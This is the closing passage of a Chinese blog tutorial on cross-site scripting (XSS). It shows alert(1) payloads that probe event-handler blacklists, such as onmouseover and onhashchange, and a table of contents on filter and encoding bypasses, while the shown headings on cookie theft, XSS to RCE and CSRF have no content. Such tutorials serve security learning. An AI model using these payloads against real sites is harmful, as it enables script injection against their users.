<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;x onmouseover\&#x3D;alert(1)\&gt;ClickHere&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<p>看onmouseover事件是否被过滤。</p>
<p>测试一个无效的事件，看看他的过滤规则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;x onclimbatree\&#x3D;alert(1)\&gt;ClickHere&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;body onhashchange\&#x3D;alert(1)\&gt;&lt;a href\&#x3D;#\&gt;click&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p>
</blockquote>
<h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a><a href="#%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p>
<h1 id="XSS-攻击面拓展"><a href="#XSS-攻击面拓展" class="headerlink" title="XSS 攻击面拓展"></a><a href="#XSS-%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95" title="XSS 攻击面拓展"></a>XSS 攻击面拓展</h1><h2 id="利用-XSS-钓鱼"><a href="#利用-XSS-钓鱼" class="headerlink" title="利用 XSS 钓鱼"></a><a href="#%E5%88%A9%E7%94%A8-XSS-%E9%92%93%E9%B1%BC" title="利用 XSS 钓鱼"></a>利用 XSS 钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a><a href="#%E9%80%9A%E8%BF%87-XSS-%E7%9B%97%E5%8F%96-Cookie" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><h2 id="XSS-to-RCE"><a href="#XSS-to-RCE" class="headerlink" title="XSS to RCE"></a><a href="#XSS-to-RCE" title="XSS to RCE"></a>XSS to RCE</h2><h2 id="XSS-配合-CSRF-的前端攻击"><a href="#XSS-配合-CSRF-的前端攻击" class="headerlink" title="XSS 配合 CSRF 的前端攻击"></a><a href="#XSS-%E9%85%8D%E5%90%88-CSRF-%E7%9A%84%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB" title="XSS 配合 CSRF 的前端攻击"></a>XSS 配合 CSRF 的前端攻击</h2><h2 id="XSS-破坏式攻击"><a href="#XSS-破坏式攻击" class="headerlink" title="XSS 破坏式攻击"></a><a href="#XSS-%E7%A0%B4%E5%9D%8F%E5%BC%8F%E6%94%BB%E5%87%BB" title="XSS 破坏式攻击"></a>XSS 破坏式攻击</h2><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067#toc-27">https://xz.aliyun.com/t/4067#toc-27</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/96#toc-7">https://xz.aliyun.com/t/96#toc-7</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackersb.cn/hacker/85.html">https://www.hackersb.cn/hacker/85.html</a></p>
<p><a target="_blank" rel="noopener" href="https://0verwatch.top/xss-encodeorder.html">https://0verwatch.top/xss-encodeorder.html</a></p>
<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/292.html">http://bobao.360.cn/learning/detail/292.html</a></p>
<p><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/103.html">https://saucer-man.com/information_security/103.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fly_hps/article/details/82944455">https://blog.csdn.net/fly_hps/article/details/82944455</a></p>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass xss过滤的测试方法</a></p>
<p><a target="_blank" rel="noopener" href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/</a></p>
<p><a target="_blank" rel="noopener" href="http://next.uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://next.uuzdaisuki.com/2018/04/24/XSS绕过和利用方式总结/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/AeolusTF">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">XSS 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E7%AD%BE%E4%B8%8E%E5%B1%9E%E6%80%A7"><span class="toc-number">1.4.</span> <span class="toc-text">一些常用的标签与属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scirpt-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">scirpt 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">img 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.3.</span> <span class="toc-text">input 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#details-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.4.</span> <span class="toc-text">details 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svg-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.5.</span> <span class="toc-text">svg 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#select-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.6.</span> <span class="toc-text">select 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.7.</span> <span class="toc-text">iframe 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#video-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.8.</span> <span class="toc-text">video 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#audio-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.9.</span> <span class="toc-text">audio 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#body-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.10.</span> <span class="toc-text">body 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#textarea-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.11.</span> <span class="toc-text">textarea 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#keygen-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.12.</span> <span class="toc-text">keygen 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#marquee-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.13.</span> <span class="toc-text">marquee 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isindex-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.4.14.</span> <span class="toc-text">isindex 标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-link-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB-JavaScript-%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">利用 link 远程包含 JavaScript 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-JavaScript-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">利用 JavaScript 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.6.1.</span> <span class="toc-text">a 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-%E6%A0%87%E7%AD%BE-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">iframe 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-%E6%A0%87%E7%AD%BE-1"><span class="toc-number">1.6.3.</span> <span class="toc-text">img 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#form-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.6.4.</span> <span class="toc-text">form 标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.</span> <span class="toc-text">XSS 常见绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">绕过空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">绕过引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.</span> <span class="toc-text">绕过括号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.3.</span> <span class="toc-text">字符串拼接绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8eval-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">利用eval()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8top"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">利用top</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">XSS 输出点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8%E5%B1%9E%E6%80%A7%E9%87%8C"><span class="toc-number">2.5.1.</span> <span class="toc-text">输出在属性里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">2.5.2.</span> <span class="toc-text">输出在HTML标签之间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8script%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">2.5.3.</span> <span class="toc-text">输出在script标签之间</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">XSS 字符编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E7%BD%91%E9%A1%B5%E8%A7%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">请求网页解码流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">HTML 实体编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript-%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">Javascript 编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.1.</span> <span class="toc-text">Unicode 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8DOM%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84JavaScript%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.2.</span> <span class="toc-text">在DOM环境中的JavaScript编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81"><span class="toc-number">3.5.</span> <span class="toc-text">混合编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG%EF%BC%9AXSS%E7%9A%84%E4%B8%80%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95"><span class="toc-number">3.6.</span> <span class="toc-text">SVG：XSS的一个黑魔法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">XSS 测试流程思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">4.1.</span> <span class="toc-text">初步测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text">测试其他标签和属性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">XSS 攻击面拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-XSS-%E9%92%93%E9%B1%BC"><span class="toc-number">5.1.</span> <span class="toc-text">利用 XSS 钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-XSS-%E7%9B%97%E5%8F%96-Cookie"><span class="toc-number">5.1.1.</span> <span class="toc-text">通过 XSS 盗取 Cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-to-RCE"><span class="toc-number">5.2.</span> <span class="toc-text">XSS to RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E9%85%8D%E5%90%88-CSRF-%E7%9A%84%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">XSS 配合 CSRF 的前端攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E7%A0%B4%E5%9D%8F%E5%BC%8F%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">XSS 破坏式攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&text=XSS 那些世人皆知的事"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&is_video=false&description=XSS 那些世人皆知的事"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS 那些世人皆知的事&body=Check out this article: http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&title=XSS 那些世人皆知的事"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&name=XSS 那些世人皆知的事&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://aeolustf.github.io/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/&t=XSS 那些世人皆知的事"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    Ae0lu5
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/AeolusTF">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
